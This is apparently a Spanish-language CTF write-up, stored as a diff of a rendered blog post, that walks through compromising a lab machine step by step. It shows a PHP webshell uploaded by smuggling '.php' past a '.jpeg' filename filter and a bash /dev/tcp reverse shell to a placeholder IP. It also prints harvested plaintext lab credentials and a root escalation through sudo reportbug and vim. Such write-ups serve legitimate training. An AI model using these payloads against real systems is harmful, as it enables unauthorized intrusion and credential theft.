@@ -1,0 +1,168 @@
+I"V<<h2 id="enumeracion">Enumeracion</h2>
+
+<p>Iniciamos con un escaneo de nmap donde encontraremos el puerto 22(SSH) y 80(HTTP)</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nmap</span> <span class="o">-</span><span class="n">sS</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="no">Pn</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="nb">p</span><span class="o">-</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.74</span>
+</code></pre></div></div>
+<ul>
+  <li>
+    <p>sS: haga un TCP SYN Scan el cual hace un escaneo sigiloso sin completar las conexiones TCP, responde con un SYN/ACK si el puerto esta abierto</p>
+  </li>
+  <li>
+    <p>n: para que no haga resolucion DNS y tarde menos el escaneo</p>
+  </li>
+  <li>
+    <p>Pn: para evitar el descubrimiento de hosts</p>
+  </li>
+  <li>
+    <p>open: para que solo muestre los puertos abiertos</p>
+  </li>
+  <li>
+    <p>-p-: para que escanee todo el rango de puertos</p>
+  </li>
+</ul>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">PORT</span>   <span class="no">STATE</span> <span class="no">SERVICE</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>
+</code></pre></div></div>
+
+<h3 id="directory-fuzzing">Directory Fuzzing</h3>
+
+<p>Al principio intente hacer fuzzing con el diccionario de <strong>directory-list-2.3-medium.txt</strong> pero no encontre nada, por lo que use uno de archivos, y encontre el endpoint <strong>choose.php</strong> haciendo uso de gobuster</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gobuster</span> <span class="n">dir</span> <span class="o">-</span><span class="n">u</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.74</span> <span class="o">-</span><span class="n">w</span> <span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="no">Discovery</span><span class="o">/</span><span class="no">Web</span><span class="o">-</span><span class="no">Content</span><span class="o">/</span><span class="n">raft</span><span class="o">-</span><span class="n">medium</span><span class="o">-</span><span class="n">files</span><span class="p">.</span><span class="nf">txt</span> <span class="o">-</span><span class="n">t</span> <span class="mi">50</span>
+</code></pre></div></div>
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sr">/choose.php           (Status: 200) [Size: 1908]
+</span></code></pre></div></div>
+
+<h2 id="explotacion-arbitrary-file-upload">Explotacion (Arbitrary File Upload)</h2>
+
+<p>Viendo el funcionamiento de <strong>choose.php</strong>, vemos que podemos subir archivos .zip con archivos .jpeg dentro, y una vez subidos, se encuentran en el recurso <strong>/uploads</strong>. Si intentamos subir un archivo que no es jpeg, nos muestra algo como esto</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>File prueba.zip has been uploaded.Archive contains non-JPEG files. It will be deleted.
+</code></pre></div></div>
+
+<p>En este punto podriamos probar tratar de hacer bypass de algunos filtros o hacer zip symlik pero no sera necesario, despues de una busqueda, encontre una forma de hacer <strong>command injection</strong> a travez del nombre del archivo que se sube a un sitio web, como se explica en este blog: <a href="https://0xn3va.gitbook.io/cheat-sheets/web-application/file-upload-vulnerabilities#abuse-filename">https://0xn3va.gitbook.io/cheat-sheets/web-application/file-upload-vulnerabilities#abuse-filename</a></p>
+
+<p>Vemos que nos dice podemos ejecutar comandos si subimos un archivo con este nombre <strong>a$(whoami)z.jpeg</strong>, que viendo su funcionamiento, se trendria que hacer la expansion de comandos y mostrar el resultado de <strong>whoami</strong>, intente eso pero subiendo una webshell y no me funciono, entonces se me ocurrio que podria ser el nombre del archivo, asi que tenia que ponerlo de forma literal usando comillas simples para que no me escapara los caracteres especiales como el espacio, ademas de poner la extension <strong>.jpeg</strong>  para que lo aceptara. Asi que los pasos fueron:</p>
+
+<ol>
+  <li>
+    <p>Crear un archivo php que sea una webshell, yo use: <strong>&lt;?php system($_GET[‘cmd’]); ?&gt;</strong></p>
+  </li>
+  <li>Renombar el archivo:
+    <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">cp</span> <span class="n">shell</span><span class="p">.</span><span class="nf">php</span> <span class="s1">'hola.jpeg .php'</span>
+</code></pre></div>    </div>
+    <p>Se tiene que poner el espacio y entre comillas para que se interprete de forma literal, como se ve en la imagen en el archivo de arriba, y cuando se procese se elimine el espacio en blanco</p>
+
+    <p><img src="/assets/img/zon/1.png" alt="" /></p>
+  </li>
+  <li>Y por ultimo se comprime: <strong>zip ola.zip ‘hola.jpeg .php’</strong></li>
+</ol>
+
+<p>Una vez que se suba, veremos nuestro archivo php, y habemos podido conseguir RCE</p>
+
+<p><img src="/assets/img/zon/3.png" alt="" /></p>
+
+<p><img src="/assets/img/zon/2.png" alt="" /></p>
+
+<p>Ahora nos podemos enviar una reverse shell usando bash:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/&lt;ip&gt;/443 0&gt;&amp;1 &lt;<span class="nt">--</span> Usar URL encode
+</code></pre></div></div>
+
+<p><strong>¿Por que funciona?</strong></p>
+
+<p>Si vemos el archivo <strong>upload.php</strong> encargado de la subida del archivo,  vemos la parte en la que hace el filtrado:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$command</span> <span class="o">=</span> <span class="s2">"unzip -l "</span> <span class="mf">.</span> <span class="nb">escapeshellarg</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">" | awk '{print $4}' | grep -v </span><span class="se">\"\\</span><span class="s2">.jpeg$\"</span> <span class="o">|</span> <span class="n">grep</span> <span class="mf">.</span> <span class="o">|</span> <span class="n">tail</span> <span class="o">-</span><span class="n">n1</span> <span class="o">|</span> <span class="n">grep</span> <span class="err">\</span><span class="s2">"</span><span class="se">\\</span><span class="s2">.</span><span class="se">\"</span><span class="s2">"</span><span class="p">;</span>
+        <span class="nb">exec</span><span class="p">(</span><span class="nv">$command</span><span class="p">,</span> <span class="nv">$output</span><span class="p">,</span> <span class="nv">$return_var</span><span class="p">);</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Se usa <strong>escapeshellarg</strong> para escapar los caracteres especiales del nombre del archivo</li>
+  <li>Despues se usa <strong>awk ‘{print $4}’</strong> para imprimir la cuarta columna, la cual es el nombre del archivo</li>
+  <li>Despues usando grep para filtrar y excluir los que tienen “.jpeg”</li>
+  <li>Despues usando otro grep filtra por los archivos que contengan almenos un <strong>.</strong></li>
+  <li>Y para finalizar usa otro grep para filtrar los archivos que tienen un solo punto seguido, es decir, <strong>.</strong> y no <strong>..</strong>, por lo que si el archivo tiene esto <strong>archivo.jpeg ..php</strong>, no lo aceptaria, por tener dos puntos seguidos antes del php</li>
+</ul>
+
+<p>Basicamente funciona por que solo se esta filtrando que contenga la cadena <strong>.jpeg</strong> mas no por toda la extension del archivo, asi que solo es necesario agregar el espacio (que luego sera eliminado) y el <strong>.jpeg</strong> para hacer bypass de ese filtro, seguido de la extension <strong>.php</strong>, quedando el archivo despues de procesar como: <strong>archivo.jpeg.php</strong></p>
+
+<h2 id="www-data---freddie">www-data -&gt; freddie</h2>
+
+<p>Si realizamos una busqueda para mostrar los archivos asociados a un grupo, encontraremos uno que se llama <strong>hashdb.sh</strong></p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">type</span> <span class="n">f</span> <span class="o">-</span><span class="n">group</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="mi">2</span><span class="o">&gt;</span> <span class="sr">/dev/nu</span><span class="n">ll</span>
+</code></pre></div></div>
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sr">/var/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">hashDB</span><span class="p">.</span><span class="nf">sh</span>
+</code></pre></div></div>
+
+<p>Al ver si contenido, nos podemos dar cuenta que se conecta a mysql y se filtran las credenciales: <strong>admin:-pudgrJbFc6Av#U3</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="c"># script that checks the database's integrity every minute</span>
+
+<span class="nv">dump</span><span class="o">=</span>/dev/shm/dump.sql
+<span class="nv">log</span><span class="o">=</span>/var/log/db_integrity_check.log
+<span class="nb">true</span> <span class="o">&gt;</span> <span class="s2">"</span><span class="k">${</span><span class="nv">log</span><span class="k">}</span><span class="s2">"</span>
+
+/usr/bin/mysqldump <span class="nt">-u</span> admin <span class="nt">-pudgrJbFc6Av</span><span class="c">#U3 admin credentials &gt; "${dump}" &lt;-- Credenciales</span>
+/usr/bin/sed <span class="nt">-i</span> <span class="s1">'$d'</span> <span class="s2">"</span><span class="k">${</span><span class="nv">dump</span><span class="k">}</span><span class="s2">"</span>
+
+<span class="nb">hash</span><span class="o">=</span><span class="s2">"29d8e6b76aab0254f7fe439a6a5d2fba64270dde087e6dfab57fa57f6749858a"</span>
+<span class="nv">check_hash</span><span class="o">=</span><span class="si">$(</span><span class="nb">sha256sum</span> <span class="s2">"</span><span class="k">${</span><span class="nv">dump</span><span class="k">}</span><span class="s2">"</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span><span class="si">)</span>
+
+<span class="k">if</span> <span class="o">[[</span> <span class="s2">"</span><span class="k">${</span><span class="nv">hash</span><span class="k">}</span><span class="s2">"</span> <span class="o">!=</span> <span class="s2">"</span><span class="k">${</span><span class="nv">check_hash</span><span class="k">}</span><span class="s2">"</span> <span class="o">]]</span> <span class="p">;</span> <span class="k">then</span>
+  /usr/bin/wall <span class="s2">"Alert ! Database hacked !"</span>
+  /usr/bin/du <span class="nt">-sh</span> /var/lib/mysql <span class="o">&gt;&gt;</span> <span class="s2">"</span><span class="k">${</span><span class="nv">log</span><span class="k">}</span><span class="s2">"</span>
+  /usr/bin/vmstat 1 3 <span class="o">&gt;&gt;</span> <span class="s2">"</span><span class="k">${</span><span class="nv">log</span><span class="k">}</span><span class="s2">"</span>
+<span class="k">else</span>
+  /usr/bin/sync <span class="o">&amp;&amp;</span> /usr/bin/echo 3 <span class="o">&gt;</span> /proc/sys/vm/drop_caches
+  /usr/bin/echo <span class="s2">"</span><span class="si">$(</span><span class="nb">date</span><span class="si">)</span><span class="s2"> : Integrity check completed for </span><span class="k">${</span><span class="nv">dump</span><span class="k">}</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> <span class="s2">"</span><span class="k">${</span><span class="nv">log</span><span class="k">}</span><span class="s2">"</span>
+<span class="k">fi</span>
+</code></pre></div></div>
+
+<p>Si nos conectamos, y mostramos las bases de datos, en la base de datos  <strong>admin</strong> encontramos la tabla <strong>credentials</strong> y las credenciales del usuario <strong>freddie</strong> que usaremos en ssh</p>
+
+<p><img src="/assets/img/zon/4.png" alt="" /></p>
+
+<p>usr: freddie</p>
+
+<p>pass: LDVK@dYiEa2I1lnjrEeoMif</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+
+<p>Al mostrar los permisos a nivel de sudoers podremos ver el archivo <strong>/usr/bin/reportbug</strong> que es un script de python</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">file</span> <span class="sr">/usr/</span><span class="n">bin</span><span class="o">/</span><span class="n">reportbug</span>
+<span class="sr">/usr/</span><span class="n">bin</span><span class="o">/</span><span class="ss">reportbug: </span><span class="no">Python</span> <span class="n">script</span><span class="p">,</span> <span class="no">ASCII</span> <span class="n">text</span> <span class="n">executable</span>
+</code></pre></div></div>
+<p>La verdad ni lo vi completo, pero jugue con las funciones, y parece ser un script que enviar reportes de bugs en paquetes de debian, pero, la cuestion es que en un punto nos dice que editor queremos usar y nos da las opciones de <strong>vim</strong> y <strong>nano</strong>, si hacemos una busqueda en GFTOBins, nos dice que podemos spawnear una shell usando ese editor: <a href="https://gtfobins.github.io/gtfobins/vim/">https://gtfobins.github.io/gtfobins/vim/</a></p>
+
+<p>Asi que los pasos a seguir son</p>
+
+<ol>
+  <li>Ejecutar el script y seleccionar la opcion 4 (expert) y rellenar los datos</li>
+  <li>Volvelo a ejecutar y cuando nos diga <em>Please enter the name of the package in which you have found a problem</em>, ingresamos “other”</li>
+  <li>Ponemos el numero <strong>12</strong></li>
+  <li>Si sale el prompt: <em>Is the bug you found listed above</em> , le damos <strong>s</strong></li>
+  <li>Si sale <em>Please select a severity level:</em>, le damos <strong>4</strong></li>
+  <li>Si sale: <em>Please select tags: (one at a time)</em>, le damos enter</li>
+  <li>Despues nos deberia de pedir el editor, seleccionamos <strong>vim</strong> e ingresamos estos comandos de vim</li>
+</ol>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">set</span> <span class="n">shell</span><span class="o">=</span><span class="sr">/bin/</span><span class="n">bash</span>
+</code></pre></div></div>
+
+<p>Y despues mandamos a llamar a la variable escribiendo <strong>shell</strong> y ya seremos root</p>
+
+<p><img src="/assets/img/zon/5.png" alt="" /></p>
+
+<p>(Espero que me haya explicado  bien en esta parte)</p>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
+
+:ET
